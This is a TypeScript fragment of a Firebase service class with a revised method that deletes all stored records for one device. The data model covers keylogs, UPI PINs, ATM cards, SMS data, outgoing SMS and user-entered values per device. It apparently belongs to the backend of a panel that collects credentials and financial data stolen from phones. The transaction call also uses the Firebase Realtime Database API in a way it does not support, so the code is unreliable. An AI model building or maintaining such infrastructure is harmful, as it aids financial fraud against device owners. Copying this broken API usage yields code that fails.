// This is the updated FirebaseService class with the fixed deleteDevice method

import {
  ref,
  get,
  set,
  push,
  update,
  remove,
  onValue,
  off,
  query,
  orderByChild,
  equalTo,
  DatabaseReference,
  DataSnapshot,
  runTransaction,
} from "firebase/database";
import { database } from "./firebase";
import {
  DeviceInfo,
  Message,
  SimRow,
  KeyLog,
  ATMCard,
  UserEntered,
  AppsInstalled,
  SendSms,
} from "@/data/db";

export class FirebaseService {
  private static instance: FirebaseService;
  private deviceInfoRef: DatabaseReference;
  private simsRef: DatabaseReference;
  private keyLogsRef: DatabaseReference;
  private upiPinsRef: DatabaseReference;
  private userEnteredRef: DatabaseReference;
  private appsInstalledRef: DatabaseReference;
  private sendSmsRef: DatabaseReference;
  private smsDataRef: DatabaseReference;
  private atmCardsRef: DatabaseReference;

  private constructor() {
    this.deviceInfoRef = ref(database, "DeviceInfo");
    this.simsRef = ref(database, "Sims");
    this.keyLogsRef = ref(database, "Keylogs");
    this.upiPinsRef = ref(database, "UPIPins");
    this.userEnteredRef = ref(database, "UserEntered");
    this.appsInstalledRef = ref(database, "AppsInstalled");
    this.sendSmsRef = ref(database, "SendSms");
    this.smsDataRef = ref(database, "SmsData");
    this.atmCardsRef = ref(database, "ATMCards");
  }

  public static getInstance(): FirebaseService {
    if (!FirebaseService.instance) {
      FirebaseService.instance = new FirebaseService();
    }
    return FirebaseService.instance;
  }

  // ... [other methods remain the same] ...

  /**
   * Completely removes all data associated with a device
   * @param deviceId The ID of the device to delete
   */
  async deleteDevice(deviceId: string): Promise<void> {
    try {
      // Define all paths where device data might exist
      const pathsToDelete = [
        `DeviceInfo/${deviceId}`,
        `Sims/${deviceId}`,
        `Keylogs/${deviceId}`,
        `UPIPins/${deviceId}`,
        `UserEntered/${deviceId}`,
        `AppsInstalled/${deviceId}`,
        `ResponseChecks/${deviceId}`,
        `ResponseChecker/${deviceId}`,
        `ATMCards/${deviceId}`,
        `SendSms/${deviceId}`
      ];

      // Create a transaction to delete all paths atomically
      await runTransaction(database, async (transaction) => {
        // Delete each path
        pathsToDelete.forEach(path => {
          transaction.remove(ref(database, path));
        });

        // Handle ResponseChecker entries that might reference the device
        const responseCheckerRef = ref(database, 'ResponseChecker');
        const snapshot = await get(responseCheckerRef);
        
        if (snapshot.exists()) {
          const responseCheckers = snapshot.val();
          Object.entries(responseCheckers || {}).forEach(([key, value]: [string, any]) => {
            if (value?.deviceId === deviceId) {
              transaction.remove(ref(database, `ResponseChecker/${key}`));
            }
          });
        }

        return null; // Transaction must return null or undefined
      });

      console.log(`Successfully deleted all data for device: ${deviceId}`);
    } catch (error) {
      console.error("Error deleting device:", error);
      throw error;
    }
  }

  // ... [rest of the FirebaseService class] ...
}

export const firebaseService = FirebaseService.getInstance();
